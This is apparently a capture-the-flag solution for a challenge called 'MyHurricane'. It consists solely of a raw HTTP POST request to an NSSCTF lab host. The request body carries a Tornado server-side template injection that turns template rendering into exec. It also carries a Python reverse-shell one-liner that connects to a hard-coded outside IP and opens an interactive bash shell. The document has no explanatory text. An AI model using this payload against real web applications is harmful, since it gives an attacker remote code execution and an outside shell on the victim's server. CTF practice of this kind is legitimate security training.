# MyHurricane
```http
POST /?aaa HTTP/1.1
Host: node6.anna.nssctf.cn:28226
Content-Length: 353
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://node6.anna.nssctf.cn:28133
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://node6.anna.nssctf.cn:28133/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=s%3AuTLax7pawd0eAQ1uWc6pybKbLUEEshHR.9fJA24mCV%2FDljjMXzrFfh0BCgpdAzREHyW5nZdR3sH0
Connection: close

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("117.72.12.120",9998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
"""
&ssti={%autoescape None%}{% raw request.body
_tt_utf8=exec%}{% set _tt_utf8=str%}{% set _tt_buffer=request.query%}&
"""

```
